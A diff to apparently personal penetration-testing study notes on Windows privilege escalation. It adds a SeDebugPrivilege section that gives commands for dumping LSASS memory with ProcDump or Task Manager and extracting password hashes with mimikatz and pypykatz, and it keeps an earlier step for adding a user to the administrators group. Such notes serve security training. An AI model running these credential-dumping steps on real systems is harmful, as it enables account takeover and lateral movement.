@@ -260,6 +260,28 @@ Abuse of the research methodology of executable of windows. We will try to place
 - `sc start daclsvc`
 - We should be added to the administrators group `net localgroup administrators`
 
+## Escalation via User Privileges
+
+### SeDebugPrivilege
+
+#### Enumeration
+
+- `whoami /priv` the `SeDebugPrivilege` should be listed
+
+#### Exploitation
+
+- `procdump.exe -accepteula -ma lsass.exe lsass.dmp` We will use ProcDump from the SysInternals suite to leverage this privilege and dump the lsass process memory.
+- We can launch mimikatz from our target
+  - `mimikatz.exe`
+  - `log`
+  - `sekurlsa::minidump lsass.dmp`
+  - `sekurlsa::logonpasswords`
+  - And now we can take the hashes we need
+- If mimikatz does not work and if we have RDP we can dump lsass from the taskmanager (tab "Details" right click on the lsass process and select "Create dump file"
+- We can then take the dump to our attack machine et use pypykatz 
+  - `pypykatz lsa minidump lsass.DMP`
+
+
 ## Resources
 
 {% embed url="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" %} TCM Security Academy - Windows Privilege Escalation {% endembed %}  
